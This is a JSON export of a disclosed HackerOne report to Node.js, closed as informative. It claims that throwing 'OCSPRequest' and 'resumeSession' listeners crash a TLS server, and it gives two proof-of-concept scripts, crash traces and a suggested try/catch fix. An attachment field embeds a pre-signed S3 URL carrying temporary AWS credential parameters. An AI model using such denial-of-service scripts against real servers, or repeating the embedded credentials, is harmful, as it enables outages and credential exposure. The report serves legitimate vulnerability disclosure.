@@ -1,0 +1,122 @@
+{
+  "id": 3781015,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgxMDE1",
+  "url": "https://hackerone.com/reports/3781015",
+  "title": " Incomplete Fix for CVE-2026-21637: OCSPRequest and resumeSession Events Crash Node.js TLS Server via Unhandled Synchronous Exceptions",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2026-06-04T01:45:46.611Z",
+  "submitted_at": "2026-06-04T01:45:47.609Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shinchan_69",
+    "url": "/shinchan_69",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d7g44qc5ookwtbkhfpmjyrgbbjfp/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-21637"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-12T09:46:19.831Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-12T09:46:18.945Z",
+  "team_member_agreed_on_going_public_at": "2026-06-12T08:54:35.082Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe March 2026 security release patched CVE-2026-21637 by wrapping `SNICallback`, `ALPNCallback`, and `pskCallback` invocations in `try/catch` blocks inside `lib/internal/tls/wrap.js`. That fix is present in v26.3.0.\n\nHowever, two other TLS callback paths in the same file were left unprotected:\n\n1. `socket.server.emit('OCSPRequest', ...)` in `requestOCSP()` — line 325\n2. `owner.server.emit('resumeSession', ...)` in `loadSession()` — line 196\n\nIf a server registers a listener on either of these events and that listener throws a synchronous exception, the exception propagates uncaught out of the native `MakeCallback` call stack and terminates the entire Node.js process. A remote client can trigger both code paths during the TLS handshake without any authentication, making this a remotely exploitable denial-of-service.\n\nThis was confirmed against the v26.3.0 source checked out at commit `b7e6a5d3`.\n\n---\n\n## Vulnerability Details\n\n### 1. `OCSPRequest` — `requestOCSP()`, line 325\n\n```js\n// lib/internal/tls/wrap.js — line 324-328\ndebug('server oncertcb emit OCSPRequest');\nsocket.server.emit('OCSPRequest',       // <-- no try/catch\n                   ctx.getCertificate(),\n                   ctx.getIssuer(),\n                   onOCSP);\n```\n\nThis emit is reached via two separate paths in `loadSNI()`:\n\n**Path A — line 210-211** (no servername or no SNICallback):\n```js\nif (!servername || !owner._SNICallback)\n    return requestOCSP(owner, info);   // called before any try/catch\n```\n\n**Path B — line 230** (inside the SNICallback async callback):\n```js\ntry {\n    owner._SNICallback(servername, (err, context) => {\n        // ...\n        requestOCSP(owner, info);      // try/catch has already exited\n    });\n} catch (err) {\n    owner.destroy(err);\n}\n```\n\nIn Path B, since `_SNICallback` is asynchronous, the `try/catch` completes before the callback fires. Any exception thrown inside `requestOCSP()` from within that callback is uncaught.\n\n### 2. `resumeSession` — `loadSession()`, line 196\n\n```js\n// lib/internal/tls/wrap.js — line 193-196\nif (hello.sessionId.length <= 0 ||\n    hello.tlsTicket ||\n    (owner.server &&\n    !owner.server.emit('resumeSession', hello.sessionId, onSession))) {  // <-- no try/catch\n```\n\nThere is no `try/catch` anywhere in `loadSession()`. A synchronous throw from a `resumeSession` listener crashes the process.\n\n### Why the March 2026 Patch Did Not Cover These\n\nThe March 2026 release patched `SNICallback` inside `loadSNI()` with an explicit `try/catch`. The same release notes acknowledged this was an incomplete fix for CVE-2026-21637 but only named SNICallback. The `OCSPRequest` and `resumeSession` paths were not addressed and remain exposed in v26.3.0 as shipped.\n\n---\n\n## Steps to Reproduce\n{F6036111}\n### Prerequisites\n\nGenerate a self-signed cert and key:\n\n```bash\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \\\n  -days 1 -nodes -subj \"/CN=localhost\"\n```\n\n### PoC 1 — `OCSPRequest` crash\n\nSave as `poc_ocsp.js`:\n\n```js\nconst tls = require('tls');\nconst fs  = require('fs');\n\nconst server = tls.createServer({\n  key:  fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem'),\n}, (socket) => { socket.write('ok\\n'); });\n\n// Listener throws synchronously\nserver.on('OCSPRequest', (cert, issuer, cb) => {\n  throw new Error('crash: unhandled exception in OCSPRequest listener');\n});\n\nserver.listen(8443, () => {\n  console.log('[*] Server up. Sending OCSP request...');\n  tls.connect(8443, 'localhost', {\n    rejectUnauthorized: false,\n    requestOCSP: true,       // triggers the OCSPRequest event server-side\n  }, () => {});\n});\n```\n\nRun:\n```bash\nnode poc_ocsp.js\n```\n\n### PoC 2 — `resumeSession` crash\n\nSave as `poc_resume.js`:\n\n```js\nconst tls = require('tls');\nconst fs  = require('fs');\n\nconst server = tls.createServer({\n  key:  fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem'),\n}, (socket) => { socket.write('ok\\n'); });\n\n// Listener throws synchronously\nserver.on('resumeSession', (id, cb) => {\n  throw new Error('crash: unhandled exception in resumeSession listener');\n});\n\nlet savedSession = null;\n\n// First connection: capture a session to resume\nconst c1 = tls.connect(8443, 'localhost', { rejectUnauthorized: false }, () => {\n  savedSession = c1.getSession();\n  c1.end();\n\n  // Second connection: present the session, triggering resumeSession\n  setTimeout(() => {\n    tls.connect(8443, 'localhost', {\n      rejectUnauthorized: false,\n      session: savedSession,\n    }, () => {});\n  }, 200);\n});\n\nserver.listen(8443, () => {\n  console.log('[*] Server up. Performing session resumption...');\n});\n```\n\nRun:\n```bash\nnode poc_resume.js\n```\n\n---\n\n## Output\n\n### PoC 1 — `OCSPRequest`\n\n```\n[*] Server up. Sending OCSP request...\n\n/home/user/poc_ocsp.js:10\n  throw new Error('crash: unhandled exception in OCSPRequest listener');\n  ^\n\nError: crash: unhandled exception in OCSPRequest listener\n    at Server.<anonymous> (/home/user/poc_ocsp.js:10:9)\n    at Server.emit (node:events:509:20)\n    at requestOCSP (node:internal/tls/wrap:325:17)\n    at TLSWrap.loadSNI [as oncertcb] (node:internal/tls/wrap:211:12)\n\nNode.js v26.3.0\n```\n\nThe process exits. The server is dead after a single client connection.\n\n### PoC 2 — `resumeSession`\n\n```\n[*] Server up. Performing session resumption...\n\n/home/user/poc_resume.js:8\n  throw new Error('crash: unhandled exception in resumeSession listener');\n  ^\n\nError: crash: unhandled exception in resumeSession listener\n    at Server.<anonymous> (/home/user/poc_resume.js:8:9)\n    at Server.emit (node:events:509:20)\n    at loadSession (node:internal/tls/wrap:196:7)\n    at TLSWrap.onclienthello (node:internal/tls/wrap:862:20)\n\nNode.js v26.3.0\n```\n\n---\n\n## Impact\n\n## Impact\n\nAny TLS server running Node.js v26.3.0 that registers an `OCSPRequest` or `resumeSession` listener is vulnerable. If the listener throws under any condition — including expected error cases like a failed OCSP lookup or a cache miss during session resumption — a remote client can crash the server by sending the appropriate TLS extension. No authentication is required. The crash is deterministic and repeatable.\n\nReal-world listeners commonly throw in these scenarios:\n- `OCSPRequest`: network call to a CA fails and an exception is thrown instead of calling `cb(err)`\n- `resumeSession`: a session store (Redis, Memcached) client is not yet connected and accessing it throws\n\n---\n\n## Suggested Fix\n\nWrap both vulnerable emits in `try/catch` blocks, calling `socket.destroy(err)` or `owner.destroy(err)` on catch — identical to what was done for `SNICallback` in the March 2026 patch.\n\n**`requestOCSP()` — line 324-328:**\n```js\ndebug('server oncertcb emit OCSPRequest');\ntry {\n  socket.server.emit('OCSPRequest',\n                     ctx.getCertificate(),\n                     ctx.getIssuer(),\n                     onOCSP);\n} catch (err) {\n  socket.destroy(err);\n}\n```\n\n**`loadSession()` — line 193-203:**\n```js\ntry {\n  if (hello.sessionId.length <= 0 ||\n      hello.tlsTicket ||\n      (owner.server &&\n      !owner.server.emit('resumeSession', hello.sessionId, onSession))) {\n    owner._handle.endParser();\n  }\n} catch (err) {\n  owner.destroy(err);\n}\n```\n\n---\n\n## References\n\n- **CVE-2026-21637** — Original TLS callback DoS (PSK/ALPN, Jan 2026): https://nodejs.org/en/blog/vulnerability/december-2025-security-releases\n- **CVE-2026-21637 incomplete fix** — SNICallback in `loadSNI()` (Mar 2026): https://nodejs.org/en/blog/vulnerability/march-2026-security-releases\n- **Node.js v26.3.0 release**: https://nodejs.org/en/blog/release/v26.3.0\n- **Vulnerable source, v26.3.0, commit b7e6a5d3**: `lib/internal/tls/wrap.js`, lines 196 and 325\n- **CWE-248**: https://cwe.mitre.org/data/definitions/248.html",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6036111,
+      "file_name": "ocsp_and_resume_poc.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z2yllo102tc5uktnl2gwu6ebzzpw?response-content-disposition=attachment%3B%20filename%3D%22ocsp_and_resume_poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27ocsp_and_resume_poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6FMDKG2V%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T111726Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEsaCXVzLXdlc3QtMiJHMEUCIDn1381vb9pZ8tl6cpv9ocEHn9YdaqfURhCuseSVfFLyAiEAn9k1eTLaiTw1C8Do7A9vVRB84o5HjLE0UEutAQvUxJEqsgUIFBADGgwwMTM2MTkyNzQ4NDkiDPeNyuYHMLFkUCipnyqPBe7hGVShgpAdxjc2vvB%2FLCfHi%2Bco4JbjTbskjFNbjOTrkCJEPgSfyFL2XkjkZZbHs5SMT5r61eqbpMxHX6to2PyAFE2Py3nVZXZOCrefit7Xv1Eb3BmEuzegbfC7pSJqNQPz5uyb9IvtbQ9og3LbizWmJThU8ylDb%2FDtjK%2F7VzKHKkl5inlud99EKxAUufZXARLhWXoeM8v%2F2r6TvlQ%2BBFz7lK8rhE75x6g0xZyvQTkvVIAlMC8qc7W4GB%2BDGdp8kXwa9Gjm4EhoZAIbV2X8E4ICV7l%2Brm%2Fdl2LZl5Hq%2BzvME30hYoa9kohu7czwDwPT1CkHkSSpojDCvfKLPstGDue4u%2FthYiAtahRVqMDT1z8ma%2FxIHsHluLi5usi6Q8NkW%2FpwOyoBF%2BezjqdT3yiFNDU0nD8eyeNIauActA8qLjyPEWv1XEKCIiataTt%2Bg%2FkpEQGKR9rk%2F0ornR7sHmYijUFkg1TM5X1IUzJoVUXp4x%2BsJKtxi6fLNGvjpONbKvm4P%2FAYX5NyZWRmKXd7i9zezHG3TJHWQrD4T05eJQYIJLiuC9yIOvIydIpUl4uF7hbt5C2Jymqg4ok%2Fu4YHpLTx%2BCLN3NgNkh1iiRW6lClqXQOnWhijbh%2FAvhsaBmiSxxjeeLPh2SERDiDgUHqN9fsMEo3BFvWwdyCbKXYrdpGPimoAst6SERywD3Cuofx%2BcdrjbO0fsDxd3vol9r4aA4ZjU7FYCYXvZ72s3IGyI8AdFyzStICQO32EQbKohyGWnTlGHshBE4%2BtayP5kCRIMPacZ7NyprZ8OZi3VihtxURi1XBTx8kfo149mwc9r0imY3RDNWRv2ButPdlwW2QMKqmAVmbS1UuVseqVi3oppwMK2tEwwcav0QY6sQGH%2FUDfCnRAp7YLI%2FA3JiDbfca2O762Ncm%2B8STymMlw%2FxW30l%2BfzN%2B8rNqgSuDhtaICwQxHzGvwuFFwJTl5TXuW3E0mLUx9eFz0P2hqnb4%2BhUAsFqZONOYNWkoyTm9%2FxPtc9W%2BjUA5myPXlaBbVjNZaw5rjTPuMng5x7LM2ynnRjNQT9AW1dLDnbwxdSLPA3lpK%2F%2BTwgQ554qJTppbvhpXfhfFka5GdNOIB5RMR0xJD5Fw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0b11c4906ae2375a1f2e601c4bbbefcdb9b76293028a708b79e3bb34c1f8ad44",
+      "file_size": 2831341,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
